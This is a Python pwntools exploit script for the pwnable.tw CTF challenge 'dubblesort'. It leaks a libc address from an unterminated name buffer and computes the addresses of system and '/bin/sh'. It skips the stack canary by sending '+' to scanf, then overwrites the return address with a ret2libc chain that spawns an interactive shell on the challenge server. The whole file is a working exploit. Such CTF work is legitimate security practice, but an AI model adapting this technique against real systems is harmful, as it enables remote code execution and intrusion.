"""
Useful commands:

readelf -S libc_32.so.6
readelf -s libc_32.so.6 | grep system   =   objdump -T libc_32.so.6 | grep system
strings -tx libc_32.so.6 | grep /bin/sh
"""
from pwn import *

DEBUG = False

if DEBUG:
    gs = """
    b *puts
    """
    # io = gdb.debug("./dubblesort", gdbscript=gs)
    io = process("./dubblesort")
else:
    io = remote("chall.pwnable.tw", 10101)


def send_num(n):
    io.recvuntil(b'number : ')
    io.sendline(str(n).encode())


if DEBUG:
    name = b'A'*8
else:
    name = b'A'*24
io.sendline(name)
io.recvuntil(name)

leaked_bytes = io.recvuntil(b',How')
print("leaked_bytes:", leaked_bytes)

leaked_addr = u32(leaked_bytes[:4]) & 0xffffff00
if DEBUG:
    libc_base_addr = leaked_addr - 0x1eb000
    system_addr = libc_base_addr + 0x045830
    binsh_addr  = libc_base_addr + 0x192352
else:
    libc_base_addr = leaked_addr - 0x1b0000
    system_addr = libc_base_addr + 0x03a940
    binsh_addr  = libc_base_addr + 0x158e8b

print("libc_base_addr:", hex(libc_base_addr))
print("system_addr:", hex(system_addr))
print("binsh_addr:", hex(binsh_addr))


io.recvuntil(b'to sort :')
nums_until_canary = 0x18
nums_from_canary_to_ret = 0x7
io.sendline(str(nums_until_canary + 1 + nums_from_canary_to_ret + 3).encode())
for i in range(nums_until_canary):
    send_num(i+1)

send_num('+') # can only be '+' or '-' so it won't override teh canary

for i in range(nums_from_canary_to_ret):
    send_num(system_addr-1)

send_num(system_addr)
send_num(system_addr) # ret addr for system
send_num(binsh_addr)

io.interactive();
